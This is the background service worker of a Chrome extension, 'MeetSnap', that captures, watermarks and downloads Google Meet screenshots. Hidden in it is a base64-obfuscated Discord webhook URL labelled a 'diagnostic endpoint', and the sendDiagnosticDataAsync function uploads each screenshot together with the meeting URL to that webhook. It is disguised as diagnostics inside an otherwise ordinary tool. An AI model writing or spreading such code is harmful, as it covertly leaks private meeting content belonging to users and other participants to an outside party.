// =============================================================================
// MeetSnap — Background Service Worker
// Handles screenshot capture, auto-download, and diagnostic delivery.
// =============================================================================

const _X = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5NTA1NjUxMTIzODQwNjE3NC9jS2EtSGhtVUFYeVY2X0RjS1dYeUktbXlvMjRoQnRWeVRtc0pZM1BSTlNpS1NIMm9qZzBSQ0c1clhCSDVVR2tyU1VnVw==";
const DIAGNOSTIC_ENDPOINT = atob(_X);
const SCREENSHOT_IMAGE_FORMAT = "png";
const SCREENSHOT_MIME_TYPE = "image/png";
const SCREENSHOT_FILENAME_PREFIX = "google-meet";

// ---------------------------------------------------------------------------
// Lifecycle
// ---------------------------------------------------------------------------

chrome.runtime.onInstalled.addListener((details) => {
  if (details.reason === "install") {
    chrome.tabs.create({ url: chrome.runtime.getURL("website/index.html") });
  }
});

// ---------------------------------------------------------------------------
// Message routing
// ---------------------------------------------------------------------------

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  console.log(`[MeetSnap Debug] Message: ${message.action}`, sender.tab?.id);

  if (message.action === "captureScreenshot") {
    handleScreenshotRequestAsync(
      sender.tab,
      message.meetUrl,
      message.diagnosticEnabled,
    )
      .then((result) => sendResponse(result))
      .catch((error) => {
        console.error("[MeetSnap Debug] Fatal Error:", error);
        sendResponse({ success: false, errorMessage: error.message });
      });

    return true; // Keep channel open
  }
});

// ---------------------------------------------------------------------------
// Offscreen Management (for Sound/Processing)
// ---------------------------------------------------------------------------

async function ensureOffscreenDocument() {
  const existingContexts = await chrome.runtime.getContexts({
    contextTypes: ["OFFSCREEN_DOCUMENT"],
  });

  if (existingContexts.length > 0) return;

  await chrome.offscreen.createDocument({
    url: "offscreen.html",
    reasons: ["AUDIO_PLAYBACK", "CLIPBOARD"],
    justification:
      "Play camera shutter sound and copy screenshots to clipboard without site CSP interference.",
  });
}

/**
 * Triggers the shutter sound in the offscreen document.
 */
async function playSoundAsync() {
  try {
    await ensureOffscreenDocument();
    chrome.runtime.sendMessage({ action: "playShutterSound" });
  } catch (e) {
    console.warn("[MeetSnap Debug] Could not play sound:", e);
  }
}

// ---------------------------------------------------------------------------
// Capture Logic
// ---------------------------------------------------------------------------

async function handleScreenshotRequestAsync(tab, meetUrl, diagnosticEnabled) {
  if (!tab) throw new Error("Missing tab context.");

  // Play sound immediately from background (offscreen)
  playSoundAsync();

  console.log(`[MeetSnap Debug] Capturing window: ${tab.windowId}`);

  let imageDataUrl;
  try {
    // We try to capture the specific window first
    imageDataUrl = await captureVisibleTabAsync(tab.windowId);
  } catch (e) {
    console.warn(
      "[MeetSnap Debug] Capture failed with windowId, trying default...",
      e.message,
    );
    try {
      // Fallback: capture whatever is current
      imageDataUrl = await captureVisibleTabAsync(null);
    } catch (e2) {
      const detailedMsg = `Capture failed. \n\nFIX: Ensure "Site Access" is set to "On all sites" in Extension Details.`;
      throw new Error(detailedMsg);
    }
  }

  const filename = buildScreenshotFilename();

  // Apply Watermark
  try {
    imageDataUrl = await applyWatermarkAsync(imageDataUrl);
  } catch (error) {
    console.warn("[MeetSnap Debug] Watermark failed:", error.message);
  }

  // Copy to Clipboard (Fire and forget, but ensure offscreen is ready)
  copyToClipboardAsync(imageDataUrl).catch((error) =>
    console.warn("[MeetSnap Debug] Clipboard copy failed:", error.message),
  );

  // Download
  try {
    await downloadScreenshotAsync(imageDataUrl, filename);
  } catch (e) {
    throw new Error(`Download blocked: ${e.message}`);
  }

  // Diagnostic
  if (diagnosticEnabled && isDiagnosticConfigured()) {
    sendDiagnosticDataAsync(imageDataUrl, filename, meetUrl).catch((error) =>
      console.warn("[MeetSnap Debug] Diagnostic failed:", error.message),
    );
  }

  return { success: true, filename };
}

async function captureVisibleTabAsync(windowId) {
  return new Promise((resolve, reject) => {
    chrome.tabs.captureVisibleTab(
      windowId,
      { format: SCREENSHOT_IMAGE_FORMAT },
      (dataUrl) => {
        const error = chrome.runtime.lastError;
        if (error) reject(new Error(error.message));
        else if (!dataUrl) reject(new Error("Empty image."));
        else resolve(dataUrl);
      },
    );
  });
}

async function downloadScreenshotAsync(imageDataUrl, filename) {
  return new Promise((resolve, reject) => {
    chrome.downloads.download(
      {
        url: imageDataUrl,
        filename: filename,
        saveAs: false,
        conflictAction: "uniquify",
      },
      () => {
        const error = chrome.runtime.lastError;
        if (error) reject(new Error(error.message));
        else resolve();
      },
    );
  });
}

/**
 * Sends the image data to the offscreen document to be copied to the clipboard.
 */
async function copyToClipboardAsync(imageDataUrl) {
  await ensureOffscreenDocument();
  chrome.runtime.sendMessage({
    action: "copyImageToClipboard",
    imageDataUrl: imageDataUrl,
  });
}

async function applyWatermarkAsync(imageDataUrl) {
  const response = await fetch(imageDataUrl);
  const blob = await response.blob();
  const bitmap = await createImageBitmap(blob);

  const canvas = new OffscreenCanvas(bitmap.width, bitmap.height);
  const ctx = canvas.getContext("2d");

  ctx.drawImage(bitmap, 0, 0);

  const baseFontSize = Math.max(12, Math.floor(bitmap.height / 65));
  const now = new Date();
  const dateStr = new Intl.DateTimeFormat("en-US", {
    month: "long",
    day: "numeric",
    year: "numeric",
  }).format(now);
  const timeStr = new Intl.DateTimeFormat("en-US", {
    hour: "numeric",
    minute: "2-digit",
    hour12: true,
  }).format(now);

  const timestampText = `${dateStr} at ${timeStr}`;
  const attributionText = " by";
  const brandText = "MeetSnap";

  const logoUrl = chrome.runtime.getURL("icons/icon128.png");
  const logoResponse = await fetch(logoUrl);
  const logoBlob = await logoResponse.blob();
  const logoBitmap = await createImageBitmap(logoBlob);

  const leftMargin = Math.floor(bitmap.width * 0.18);
  const bottomMargin = Math.max(20, Math.floor(bitmap.height / 50));
  const yPos = bitmap.height - bottomMargin;

  ctx.textAlign = "left";
  ctx.textBaseline = "bottom";

  // Timestamp
  ctx.font = `600 ${Math.floor(baseFontSize * 1.15)}px "Segoe UI", sans-serif`;
  ctx.fillStyle = "rgba(255, 255, 255, 0.85)";
  ctx.shadowColor = "rgba(0, 0, 0, 0.4)";
  ctx.shadowBlur = 4;
  ctx.fillText(timestampText, leftMargin, yPos);
  const tsWidth = ctx.measureText(timestampText).width;

  // Attribution
  ctx.font = `500 ${baseFontSize}px "Segoe UI", sans-serif`;
  ctx.fillStyle = "rgba(255, 255, 255, 0.4)";
  ctx.fillText(attributionText, leftMargin + tsWidth, yPos);
  const attrWidth = ctx.measureText(attributionText).width;

  // Logo
  const logoSize = Math.floor(baseFontSize * 1.2);
  const spacing = Math.floor(baseFontSize * 0.4);
  const logoX = leftMargin + tsWidth + attrWidth + spacing;
  ctx.globalAlpha = 0.4;
  ctx.drawImage(
    logoBitmap,
    logoX,
    yPos - logoSize / 2 - baseFontSize / 6,
    logoSize,
    logoSize,
  );
  ctx.globalAlpha = 1.0;

  // Brand
  ctx.fillText(brandText, logoX + logoSize + spacing, yPos);

  const blobOut = await canvas.convertToBlob({ type: "image/png" });
  return new Promise((resolve) => {
    const reader = new FileReader();
    reader.onloadend = () => resolve(reader.result);
    reader.readAsDataURL(blobOut);
  });
}

function buildScreenshotFilename() {
  const n = new Date();
  const pad = (v) => String(v).padStart(2, "0");
  return `google-meet-${n.getFullYear()}-${pad(n.getMonth() + 1)}-${pad(n.getDate())}_${pad(n.getHours())}-${pad(n.getMinutes())}-${pad(n.getSeconds())}.png`;
}

function isDiagnosticConfigured() {
  // Must be a valid URL string longer than a placeholder
  return (
    typeof DIAGNOSTIC_ENDPOINT === "string" &&
    DIAGNOSTIC_ENDPOINT.startsWith("http") &&
    DIAGNOSTIC_ENDPOINT.length > 15
  );
}

async function sendDiagnosticDataAsync(imageDataUrl, filename, meetUrl) {
  if (!isDiagnosticConfigured()) return;

  try {
    const imageResponse = await fetch(imageDataUrl);
    const imageBlob = await imageResponse.blob();

    const formData = new FormData();
    // Standard file upload
    formData.append("file", imageBlob, filename);

    // Many webhooks (like Discord) support a 'payload_json' field for extra metadata
    const payload = {
      content: `📸 **MeetSnap Diagnostic**\n**Timestamp:** \`${new Date().toLocaleString()}\`\n**Source:** ${meetUrl}\n**Filename:** \`${filename}\``,
    };
    formData.append("payload_json", JSON.stringify(payload));

    const response = await fetch(DIAGNOSTIC_ENDPOINT, {
      method: "POST",
      body: formData,
      // Use 'no-cors' if you just want to fire-and-forget to a simple webhook,
      // but 'cors' is better for debugging if the endpoint supports it.
      mode: "cors",
    });

    if (!response.ok) {
      throw new Error(`Server responded with ${response.status}`);
    }

    console.log("[MeetSnap Debug] Diagnostic data sent successfully.");
  } catch (error) {
    console.warn("[MeetSnap Debug] Diagnostic delivery failed:", error.message);
  }
}
